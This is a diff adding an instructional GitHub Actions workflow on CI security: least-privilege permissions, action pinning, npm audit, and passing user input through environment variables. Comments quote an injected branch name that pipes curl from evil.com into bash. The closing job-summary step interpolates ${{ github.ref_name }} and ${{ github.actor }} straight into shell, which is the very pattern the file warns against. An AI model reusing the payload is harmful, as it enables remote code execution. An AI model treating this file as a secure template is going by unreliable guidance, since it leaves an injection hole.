@@ -1,0 +1,109 @@
+# ============================================
+# WORKFLOW 7: Security Best Practices
+# ============================================
+
+name: 07 - Security
+
+# Restrict ALL permissions at workflow level (deny by default)
+permissions:
+  contents: read     # can read repo files
+  # everything else is denied unless overridden at job level
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+
+  secure-test:
+    name: Secure Test Job
+    runs-on: ubuntu-latest
+
+    # Job-level permissions override workflow-level
+    permissions:
+      contents: read
+      checks: write      # needed to post test results
+
+    steps:
+      # Pin to commit SHA — not just a tag — for untrusted actions
+      # (For official actions like checkout, tag is fine)
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4 SHA
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          cache: 'npm'
+
+      - run: npm ci
+
+      # ✅ SAFE: user input stored in env var first
+      # Imagine github.ref_name could be "main; curl evil.com | bash"
+      - name: Print branch info (injection-safe)
+        env:
+          BRANCH_NAME: ${{ github.ref_name }}    # stored in env var
+          ACTOR: ${{ github.actor }}
+        run: |
+          echo "Branch: $BRANCH_NAME"            # safe — shell won't interpret
+          echo "Actor: $ACTOR"
+
+      # ❌ NEVER do this (shown only as example of what NOT to do):
+      # - run: echo "Branch: ${{ github.ref_name }}"
+      # If ref_name was: "main\"; curl evil.com | bash; echo \""
+      # the shell would execute the injected command!
+
+      - name: Run tests
+        run: npm test
+
+  security-audit:
+    name: Security Audit
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          cache: 'npm'
+      - run: npm ci
+
+      # Audit dependencies for known vulnerabilities
+      - name: Run security audit
+        run: npm audit --audit-level=moderate
+        continue-on-error: true    # don't fail the workflow (informational)
+
+      # Check for outdated dependencies
+      - name: Check outdated packages
+        run: npm outdated || true    # || true prevents failure exit code
+
+  # Job that uses GITHUB_TOKEN explicitly
+  create-summary:
+    name: Create Job Summary
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          cache: 'npm'
+      - run: npm ci
+      - run: npm test
+
+      # Write to GitHub's Job Summary (visible in Actions UI)
+      - name: Write job summary
+        if: always()
+        run: |
+          echo "## Test Results 📊" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Item | Value |" >> $GITHUB_STEP_SUMMARY
+          echo "| ---- | ----- |" >> $GITHUB_STEP_SUMMARY
+          echo "| Status | ${{ job.status }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Branch | ${{ github.ref_name }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Commit | ${{ github.sha }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Triggered by | ${{ github.actor }} |" >> $GITHUB_STEP_SUMMARY
